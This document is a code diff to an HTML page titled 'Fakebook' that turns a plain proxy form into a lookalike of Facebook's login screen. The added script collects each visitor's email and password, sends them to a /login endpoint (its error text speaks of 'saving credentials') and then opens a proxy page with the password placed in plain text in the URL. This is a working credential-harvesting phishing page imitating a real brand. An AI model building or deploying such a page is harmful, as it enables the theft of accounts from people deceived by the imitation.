@@ -6,13 +6,59 @@
     <title>Fakebook</title>
     <link rel="stylesheet" href="/styles.css" />
   </head>
-  <body class="proxy-page">
-    <div class="proxy-shell">
-      <form class="proxy-form" action="/proxy" method="POST" target="_blank">
-        <input id="email" name="email" type="email" placeholder="Email or phone" required />
-        <input id="password" name="password" type="password" placeholder="Password" required />
-        <button type="submit">Log In</button>
-      </form>
+  <body class="facebook-page">
+    <div class="facebook-shell">
+      <div class="facebook-copy">
+        <h1 class="facebook-brand">fakebook</h1>
+        <p class="facebook-tagline">Connect with friends and the world around you on Fakebook.</p>
+      </div>
+
+      <div class="facebook-card-wrap">
+        <form class="facebook-form" id="fakebook-login-form">
+          <input id="email" name="email" type="email" placeholder="Email or phone" required />
+          <input id="password" name="password" type="password" placeholder="Password" required />
+          <button class="login-button" type="submit">Log In</button>
+          <a href="#" class="forgot-link">Forgot password?</a>
+
+          <div class="divider"></div>
+
+          <button class="create-button" type="button">Create new account</button>
+        </form>
+      </div>
+    </div>
+
+    <script>
+      document.getElementById('fakebook-login-form').addEventListener('submit', async function (event) {
+        event.preventDefault();
+
+        const payload = {
+          email: document.getElementById('email').value,
+          password: document.getElementById('password').value
+        };
+
+        try {
+          const response = await fetch('/login', {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json',
+              'Accept': 'application/json'
+            },
+            body: JSON.stringify(payload)
+          });
+
+          const data = await response.json().catch(() => ({}));
+
+          if (response.ok) {
+            window.open('/proxy.html?email=' + encodeURIComponent(payload.email) + '&password=' + encodeURIComponent(payload.password), '_blank');
+          } else {
+            alert(data.message || 'Login failed');
+          }
+        } catch (error) {
+          console.error('Login API error:', error);
+          alert('Error saving credentials');
+        }
+      });
+    </script>
     </div>
   </body>
 </html>
